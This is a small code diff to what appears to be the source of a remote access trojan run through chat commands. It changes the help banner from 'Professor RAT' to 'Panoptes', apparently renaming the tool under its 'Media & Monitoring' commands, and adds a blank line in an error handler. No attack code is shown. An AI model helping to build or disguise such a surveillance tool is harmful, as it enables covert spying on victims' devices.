@@ -1215,7 +1215,7 @@ def handle_commands():
                         
                         elif text == "/help":
                             help_text = """
-🤖 <b>Professor RAT</b> 🤖
+🤖 <b>Panoptes</b> 🤖
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 📱 <b>Media & Monitoring</b>
@@ -1285,4 +1285,5 @@ if __name__ == "__main__":
         handle_commands()
         
     except Exception as e:
+
         time.sleep(30)
